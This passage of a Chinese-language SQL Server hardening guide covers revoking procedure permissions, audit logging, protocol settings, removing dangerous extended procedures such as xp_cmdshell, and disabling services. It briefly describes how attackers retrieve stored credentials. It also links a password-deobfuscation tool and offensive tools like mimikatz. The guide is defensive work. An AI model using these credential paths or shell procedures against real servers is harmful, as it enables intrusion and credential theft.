Microsoft 数据转换服务（DTS）程序包是一组 COM 接口，可用于在 SQL Server 上使用以下命令执行许多管理任务：T-SQL，Windows 脚本和可执行工具。 默认情况下，企业管理器用户可以访问可用 DTS 软件包列表。 过程 sp_enum_ dtspackages 将显示可以输入到 sp_get_dtspackage 中的软件包名称和 ID 号，这将返回软件包数据。 然后，攻击者可能会将程序包放入他的 SQL Server 本地安装中，并查看程序包详细信息，其中通常包含其他服务器的凭据。 这些程序的特权应被删除：

```
revoke execute on sp_enum_dtspackages to public
revoke execute on sp_get_dtspackage to public
```

sp_get_SQLAgent_properties 存储过程，用于显示 SQL Server 代理服务连接到数据库服务器的混淆密码。 使用此工具（[http://jimmers.narod.ru/agent_pwd.c）可以解混淆。](http://jimmers.narod.ru/agent_pwd.c%EF%BC%89%E5%8F%AF%E4%BB%A5%E8%A7%A3%E6%B7%B7%E6%B7%86%E3%80%82) 应删除此程序的权限：

```
revoke execute on sp_get_SQLAgent_properties to public
```

Microsoft 数据转换服务（DTS）用于处理来自多个源（例如 OLE DB，ODBC 或文本文件）的数据。 连接密码以明文形式保存在 Col11120 列的表 RTblDBMProps 中，因此任何具有选择特权的人都可以检索到。 使用以下命令锁定此表的权限：

```
revoke select on RTblDBMProps to public
revoke update on RTblDBMProps to public
revoke insert on RTblDBMProps to public
revoke delete on RTblDBMProps to public
```

### 配置日志审计

**开启日志审计功能**

数据库应配置日志功能，对用户登录进行审计，日志内容包括用户登录使用的账号、登录是否成功、登录时间等。

打开数据库属性，查看安全性，将服务器身份验证调整为 “SQL Server 和 Windows 身份验证模式” ，安全性中的登录审核调整为 “失败和成功的登录”。

```
Microsoft SQL Server Management Studio -> SQL Server（右键） -> 属性 -> 安全性
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422111214-899d9e3c-a318-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422111214-899d9e3c-a318-1.png)

或者通过将以下注册表值设置为 2（将其设置为 3 还将记录成功的登录）：

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSSQLServer\MSSQLServer\AuditLevel
```

### 配置网络通信协议

**禁用不必要的网络服务**

SQL Server 使用的网络通信协议应限制为最小基础架构所需。 禁用 SQL Server 运行冗余服务。 启用陌生的网络通信协议，可能增加数据库网络风险。TCP/IP 是最常用的用于 SQL Server 的网络协议栈，它与 SSL 一起为访问 SQL Server 提供安全的基础。

Microsoft SQL Server 程序组, 运行服务网络实用工具。建议只使用 TCP/IP 协议，禁用其他协议。

```
SQL Server Configuration Manager -> SQL Server网络配置 -> MSSQLSERVER的协议
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422111226-9088c3fc-a318-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422111226-9088c3fc-a318-1.png)

**加固 TCP/IP 协议栈**

查看注册表键值

```
HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\DisableIPSourceRouting
HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\EnableICMPRedirect
HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\SynAttackProtect
```

参考配置操作

对于 TCP/IP 协议栈的加固主要是某些注册表键值的修改。主要是以下几个：

```
HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\DisableIPSourceRouting #说明：该键值应设为2，以防御源路由欺骗攻击。HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\EnableICMPRedirect #说明：该键值应设为0，以ICMP重定向。HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\SynAttackProtect #说明：该键值应设为2，防御SYN FLOOD攻击。
```

**使用加密通讯协议**

启动 SQL Server 配置工具，启用 “强制协议加密”。

```
SQL Server Configuration Manager -> SQL Server网络配置 -> MSSQLSERVER的协议（右键） -> 属性
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422111239-980cbcb4-a318-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422111239-980cbcb4-a318-1.png)

### 删除不必要的存储过程

查询已有的所有的存储过程

```
select * from sysobjects where xtype='P'
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422111256-a22d31c4-a318-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422111256-a22d31c4-a318-1.png)

或者

```
Microsoft SQL Server Management Studio -> SQL Server -> 数据库 -> 系统数据库 -> master（举例）-> 可编程性 -> 存储过程/扩展存储过程 -> 系统存储过程/系统扩展存储过程
```

​ [![](https://xzfile.aliyuncs.com/media/upload/picture/20210422111417-d298adac-a318-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422111417-d298adac-a318-1.png)

删除 SQL Server 中存在的危险存储过程：

```
exec sp_dropextendedproc 'xp_cmdshell' 
exec sp_dropextendedproc 'xp_dirtree'
exec sp_dropextendedproc 'xp_enumgroups'
exec sp_dropextendedproc 'xp_fixeddrives'
exec sp_dropextendedproc 'xp_loginconfig'
exec sp_dropextendedproc 'xp_enumerrorlogs'
exec sp_dropextendedproc 'xp_getfiledetails'
exec sp_dropextendedproc 'Sp_OACreate' 
exec sp_dropextendedproc 'Sp_OADestroy' 
exec sp_dropextendedproc 'Sp_OAGetErrorInfo' 
exec sp_dropextendedproc 'Sp_OAGetProperty' 
exec sp_dropextendedproc 'Sp_OAMethod' 
exec sp_dropextendedproc 'Sp_OASetProperty' 
exec sp_dropextendedproc 'Sp_OAStop' 
exec sp_dropextendedproc 'Xp_regaddmultistring' 
exec sp_dropextendedproc 'Xp_regdeletekey' 
exec sp_dropextendedproc 'Xp_regdeletevalue' 
exec sp_dropextendedproc 'Xp_regenumvalues' 
exec sp_dropextendedproc 'Xp_regread' 
exec sp_dropextendedproc 'Xp_regremovemultistring' 
exec sp_dropextendedproc 'Xp_regwrite' 
drop procedure sp_makewebtask
```

删除不必要的存储过程，一般情况下建议删除的存储过程有：

```
sp_OACreate 
sp_OADestroy 
sp_OAGetErrorInfo 
sp_OAGetProperty 
sp_OAMethod 
sp_OASetProperty 
sp_OAStop 
sp_regaddmultistring 
xp_regdeletekey 
xp_regdeletevalue 
xp_regenumvalues 
xp_regremovemultistring
```

不是应用程序必须使用时，建议删除以下存储过程：

```
xp_perfend 
xp_perfmonitor 
xp_perfsample 
xp_perfstart 
xp_readerrorlog 
xp_readmail 
xp_revokelogin 
xp_runwebtask 
xp_schedulersignal 
xp_sendmail 
xp_servicecontrol 
xp_snmp_getstate 
xp_snmp_raisetrap 
xp_sprintf 
xp_sqlinventory 
xp_sqlregister 
xp_sqltrace 
xp_sscanf 
xp_startmail 
xp_stopmail 
xp_subdirs 
xp_unc_to_drive 
xp_dirtree 
xp_sdidebug 
xp_availablemedia 
xp_cmdshell 
xp_deletemail 
xp_dirtree 
xp_dropwebtask 
xp_dsninfo 
xp_enumdsn 
xp_enumerrorlogs 
xp_enumgroups 
xp_enumqueuedtasks 
xp_eventlog 
xp_findnextmsg 
xp_fixeddrives 
xp_getfiledetails 
xp_getnetname 
xp_grantlogin 
xp_logevent 
xp_loginconfig 
xp_logininfo 
xp_makewebtask 
xp_msver
```

### 删除不必要的功能和服务

SQL Server 的远程访问功能，允许网络上的其他 SQL Server 远程连接并执行存储过程。 如果不需要此功能，则应使用以下命令禁用该功能。

```
execute sp_configure 'remote access', '0'
go
reconfigure with override
go
```

或者使用 Microsoft SQL Server Management Studio

```
Microsoft SQL Server Management Studio -> SQL Server（右键） -> 属性 -> 连接
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422111609-15989144-a319-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422111609-15989144-a319-1.png)

配置选项 “允许更新” 定义数据库用户是否可以直接更新系统表。 这对于高级管理员来说可能是有用的临时功能，但对于正常操作，应该将其禁用：

```
execute sp_configure 'allow updates', '0'
go
reconfigure with override
go
```

SQL Server Monitor，它侦听 UDP 端口 1434 并提供客户端不应访问有关服务器上存在的实例的信息，并且 SQL Server 将在其被阻止的情况下运行。 防火墙或应阻止来自 TCP 端口 1433 和 UDP 端口 1434 的外部通信。异构查询或临时查询允许数据库用户使用本地数据在远程服务器上执行查询。 该功能可能被滥用以强制使用远程或本地访问凭据，应在不需要此功能时，将其禁用：

```
exec xp_regwrite N'HKEY_LOCAL_MACHINE', N'SOFTWARE\Microsoft\MSSQLServer\Providers\SQLOLEDB', N'DisallowAdhocAccess', N'REG_DWORD', 1
```

如果不需要，则应禁用 SQL Server 代理，Microsoft 分布式事务处理协调器（MSDTC）和 MSSearch 服务。 可以使用企业管理器或通过在 Windows Services 管理工具中将其启动类型设置为 “停止” 来关闭服务。

```
Microsoft SQL Server Management Studio -> SQL Server -> 管理
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422111621-1cae3420-a319-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422111621-1cae3420-a319-1.png)

或者设置注册表值禁用服务：

```
exec sp_set_sqlagent_properties @auto_start=0
exec xp_regwrite N'HKEY_LOCAL_MACHINE', N'SYSTEM\CurrentControlSet\Services\MSDTC', N'Start', N'REG_DWORD', 3
exec xp_regwrite N'HKEY_LOCAL_MACHINE', N'SYSTEM\CurrentControlSet\Services\MSSEARCH', N'Start', N'REG_DWORD', 3
```

进行这些更改后，应手动停止服务或重新启动服务器。

### 安装补丁

最后的步骤是确保应用最新的服务包和补丁程序。将显示 SQL Server 的当前版本。

```
select @@version
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422104547-d78eb756-a314-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422104547-d78eb756-a314-1.png)

参考链接
----

[https://www.quackit.com/sql_server/tutorial/sql_server_dts.cfm](https://www.quackit.com/sql_server/tutorial/sql_server_dts.cfm)

[http://www.freetds.org/](http://www.freetds.org/)

[http://freetds.cvs.sourceforge.net/checkout/freetds/freetds/doc/tds.html](http://freetds.cvs.sourceforge.net/checkout/freetds/freetds/doc/tds.html)

[https://research.nccgroup.com/2021/01/21/mssql-lateral-movement/](https://research.nccgroup.com/2021/01/21/mssql-lateral-movement/)

[https://xz.aliyun.com/t/7534](https://xz.aliyun.com/t/7534)

[https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit](https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit)

[https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration)

[https://h4ms1k.github.io/Red_Team_MSSQL_Server/#](https://h4ms1k.github.io/Red_Team_MSSQL_Server/#)

[https://security.tencent.com/index.php/blog/msg/154](https://security.tencent.com/index.php/blog/msg/154)

[https://www.freebuf.com/articles/es/262903.html](https://www.freebuf.com/articles/es/262903.html)

[https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8)

[https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

[https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)

[https://github.com/nccgroup/nccfsas](https://github.com/nccgroup/nccfsas)